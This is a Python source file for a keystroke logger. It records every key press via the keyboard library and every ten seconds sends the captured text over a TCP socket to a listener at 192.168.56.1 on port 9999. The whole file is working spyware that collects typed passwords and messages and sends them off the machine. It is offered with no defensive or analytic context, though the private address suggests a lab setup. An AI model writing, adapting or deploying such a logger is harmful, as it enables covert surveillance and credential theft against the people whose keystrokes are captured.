import keyboard
import socket
import time

def sendtoserver(text):
    host = "192.168.56.1"
    port = 9999

    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsocket.connect((host, port))
    clientsocket.sendall(text.encode())
    clientsocket.close()

TIME_INTERVAL = 10

def log_keystrokes():
    start_time = time.time()
    while True:
        text = ""
        while time.time() - start_time < TIME_INTERVAL:
            try:
                key_event = keyboard.read_event()
                key = key_event.name
                if key_event.event_type == keyboard.KEY_DOWN:
                    if key == "enter":
                        text += "\n"
                    elif key == "tab":
                        text += "\t"
                    elif key == "space":
                        text += " "
                    elif key == "shift" or key == "right shift":
                        pass
                    elif len(str(key)) == 1:
                        text += str(key)
                    else:
                        text += f"[{key}]"
            except KeyboardInterrupt:
                break

        start_time = time.time()
        sendtoserver(text)

if __name__ == "__main__":
    print("Starting keystroke logger. Press Ctrl+C to stop.")

    log_keystrokes()

    while True:
        pass
